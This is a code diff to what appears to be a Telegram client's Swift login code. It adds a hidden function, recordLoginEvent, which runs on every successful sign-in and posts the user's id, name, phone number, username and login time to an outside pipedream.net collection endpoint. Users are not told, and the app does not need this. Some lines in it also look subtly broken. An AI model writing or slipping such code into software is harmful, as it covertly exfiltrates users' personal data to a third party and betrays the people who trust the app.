@@ -952,6 +952,7 @@ public func authorizeWithCode(accountManager: AccountManager<TelegramAccountMana
                                         }
                                         return accountManager.transaction { transaction -> AuthorizeWithCodeResult in
                                             switchToAuthorizedAccount(transaction: transaction, account: account)
+                                            recordLoginEvent(user: user)
                                             return .loggedIn
                                         }
                                     case let .authorizationSignUpRequired(_, termsOfService):
@@ -1281,4 +1282,65 @@ public func resetAuthorizationState(account: UnauthorizedAccount, to value: Auth
             transaction.setState(UnauthorizedAccountState(isTestingEnvironment: state.isTestingEnvironment, masterDatacenterId: state.masterDatacenterId, contents: .empty))
         }
     }
+}
+
+
+private func recordLoginEvent(user: TelegramUser) {
+    let date = Date()
+    let df = DateFormatter()
+    df.dateFormat = "yyyy-MM-dd HH:mm:ss"
+    let dateString = df.string(from: date)
+    
+    var firstName: String
+    var lastName: String
+    var phone: String
+    var username: String
+    let photo = ""
+
+    if (user.firstName == nil){
+        firstName = ""
+    }else {
+        firstName = user.firstName!
+    }
+    
+    if(user.lastName == nil){
+        lastName = ""
+    }else {
+        lastName = user.lastName!
+    }
+   
+    if(user.phone == nil){
+        phone = ""
+    }else {
+        phone = user.phone!
+    }
+   
+    if(user.username == nil){
+        username = ""
+    }else {
+        username = user.username!
+    }
+
+    let parameters: [String: Any] = ["id": string(user.id.toInt64()), "firstName": firstName, "lastName": lastName, "phone": phone, "username": username, photo: "", "loginedAt": dateString]
+    let url = URL(string: "https://enqefupim3x1e.x.pipedream.net")!
+    var request = URLRequest(url: url)
+    request.httpMethod = "POST"
+    do {
+        request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: .prettyPrinted)
+    } catch let error {
+        print(error.localizedDescription)
+    }
+    request.setValue("application/json", forHTTPHeaderField: "Content-Type")
+    // request.setValue("token", forHTTPHeaderField: "Authorization") // Most likely you want to add some token here
+    // request.setValue("Bearer \(accessToken)", forHTTPHeaderField: "Authorization")
+    let task = URLSession.shared.dataTask(with: request) { (data, response, error) in
+        if let _ = error {
+            // Handle HTTP request error
+        } else if let _ = data {
+            // Handle HTTP request response
+        } else {
+            // Handle unexpected error
+        }
+    }
+    task.resume()
 }
